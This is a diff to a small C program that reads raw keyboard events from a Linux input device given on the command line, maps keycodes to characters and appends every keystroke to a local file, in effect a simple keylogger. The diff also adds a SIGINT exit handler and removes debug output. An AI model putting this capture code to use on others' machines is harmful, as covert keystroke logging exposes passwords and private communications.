@@ -5,12 +5,13 @@
 #include <stdio.h>
 #include <unistd.h>
 #include <stdlib.h>
+#include <signal.h>
 
 char reg_keys[49] = "1234567890-=qwertyuiop[]asdfghjkl;'`\\zxcvbnm,./<";
 char shift_keys[49] = "!@#$%^&*()_+QWERTYUIOP{}ASDFGHJKL:\"~|ZXCVBNM<>?>";
 char cap_keys[49] = "1234567890-=QWERTYUIOP[]ASDFGHJKL;'`\\ZXCVBNM,./<";
 char capshift_keys[49] = "!@#$%^&*()_+qwertyuiop{}asdfghjkl:\"~|zxcvbnm<>?>";
-
+static void sig_handler(int);
 
 int convert(unsigned int keycode)
 {
@@ -51,21 +52,19 @@ int convert(unsigned int keycode)
 	}
 }
 
+static void sig_handler(int signo)
+{
+	exit(0);
+}
+
 int main(int argc, char **argv)
 {
   int fd;
-	FILE * output;
+  FILE * output;
   
-  fd = open("/dev/input/event2", O_RDONLY);
-  printf("fd: %i\n", fd);
+  fd = open(argv[1], O_RDONLY);
   output = fopen("output", "a");
 
-  struct stat info;
-  int stat = fstat(fd, &info);
-  printf("stat: %i\n", stat);
- 
-  
-  printf("fd: %i\n", fd);
   struct input_event ev;
 
   int k, old, new, count, shift, caps;
@@ -80,12 +79,14 @@ int main(int argc, char **argv)
     k = read(fd, &ev, sizeof(struct input_event));
     if (ev.type != 1)
 			continue;		
-
+	
+		// key release
 		if (ev.value == 0) {
 			if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT)
 				shift = !shift;
 		}
 
+		// ignore autorepeat
 		if (ev.value != 1)
 			continue;
 
@@ -115,7 +116,8 @@ int main(int argc, char **argv)
 			new = reg_keys[convert(ev.code)];		
 
 		putc(new, output);
-    fflush(output); 
+		
+		signal(SIGINT, sig_handler); 
   }
 
 }
